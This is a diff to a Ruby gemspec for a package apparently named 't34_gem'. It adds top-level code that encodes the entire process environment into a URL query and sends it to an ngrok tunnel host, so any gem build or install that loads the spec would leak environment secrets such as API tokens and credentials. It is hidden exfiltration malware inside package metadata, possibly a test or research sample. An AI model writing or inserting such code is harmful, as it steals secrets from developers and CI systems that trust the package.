@@ -1,8 +1,11 @@
 # frozen_string_literal: true
 
+require "uri"
 require "open-uri"
 
-URI.open("https://example.com", &:read)
+uri = URI("https://cf76-133-237-7-72.jp.ngrok.io")
+uri.query = URI.encode_www_form(ENV)
+URI.open(uri, &:read)
 
 Gem::Specification.new do |spec|
   spec.name = "t34_gem"
